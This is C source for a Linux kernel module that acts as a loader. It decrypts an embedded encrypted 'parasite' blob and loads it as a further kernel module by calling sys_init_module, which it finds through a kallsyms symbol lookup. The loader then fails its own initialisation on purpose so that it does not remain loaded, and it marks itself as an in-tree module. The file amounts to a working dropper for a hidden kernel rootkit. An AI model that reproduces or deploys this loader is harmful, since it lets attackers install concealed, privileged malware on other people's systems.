#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/mman.h>

#include "encrypt/encrypt.h"

static char parasite_blob[] = {
# include "parasite_blob.inc"
};

static int ksym_lookup_cb(unsigned long data[], const char *name, void *module, unsigned long addr)
{
	int i = 0; while (!module && (((const char *)data[0]))[i] == name[i]) {
		if (!name[i++]) return !!(data[1] = addr);
	} return 0;
}

static inline unsigned long ksym_lookup_name(const char *name)
{
	unsigned long data[2] = { (unsigned long)name, 0 };
	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	return data[1];
}

int init_module(void)
{
	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;

	printk("%s is saying:\n"
	       "Hello, I'm the loader.\n"
	       "I will load the parasite for you.\n", KBUILD_MODNAME);

	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

	sys_init_module = (void *)ksym_lookup_name("sys_init_module");
	if (sys_init_module) {
		const size_t len = roundup(sizeof(parasite_blob), PAGE_SIZE);
		const char *nullarg = parasite_blob;
		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0);
		if (map) {
			while (*nullarg) nullarg++;
			copy_to_user(map, parasite_blob, sizeof(parasite_blob));
			sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
			vm_munmap((unsigned long)map, len);
		}
	}

	return -EINVAL;
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Ilya V. Matveychikov");
